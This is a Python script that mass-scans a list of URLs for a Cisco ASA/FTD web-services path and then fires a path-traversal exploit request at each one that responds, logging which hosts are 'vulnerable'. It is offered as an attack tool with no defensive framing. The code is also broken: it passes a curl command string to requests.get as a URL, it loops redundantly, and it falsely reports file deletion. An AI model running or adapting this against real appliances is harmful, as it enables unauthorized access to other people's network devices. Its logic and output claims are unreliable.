import requests
 # Set the path to the file containing the target URLs
file_path = input("Enter the path to the file containing the target URLs: ")
 # Set the path to the output file
output_file = input("Enter the path to the output file: ")
 # Read the list of target URLs from the file
with open(file_path, "r") as file:
    target_urls = file.readlines()
 # Open the output file in write mode
with open(output_file, "w") as file:
     # Loop through each target URL
    for target_url in target_urls:
        for url in target_urls:
        # Send a GET request to the target URL
            response = requests.get(url)
        # Write the response status code to the output file
        file.write(f"{url} - {response.status_code}\n")
         # Send a GET request to the target URL
        print("Checking if " + target_url.strip() + " is vulnerable...")
        response = requests.get(target_url.strip() + "/+CSCOE+/session_password.html", verify=False)
         # Check if the response code is 200
        if response.status_code == 200:
            print(target_url.strip() + " is vulnerable. Attempting to exploit...")
             # Set the curl command
            curl_command = 'curl -H "Cookie: token=../+CSCOU+/csco_logo.gif" ' + target_url.strip() + "/+CSCOT+/translationtable?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"
             # Send the curl request
            curl_response = requests.get(curl_command, verify=False)
             # Check if the curl response code is 200
            if curl_response.status_code == 200:
                 # Print the response body
                print("Exploit successful. The specified file was deleted from " + target_url.strip())
                print("Writing result to the output file...")
                 # Write the result to the output file
                file.write(target_url.strip() + " is vulnerable. The specified file was deleted.\n")
            else:
                print("The exploit failed for " + target_url.strip())
                print("Writing result to the output file...")
                # Write the result to the output file
                file.write(target_url.strip() + " is vulnerable but the exploit failed.\n")
        else:
            print(target_url.strip() + " is not vulnerable.")
            print("Writing result to the output file...")
            # Write the result to the output file
            file.write(target_url.strip() + " is not vulnerable.\n")
 # Print the success message
print("The results have been saved to " + output_file)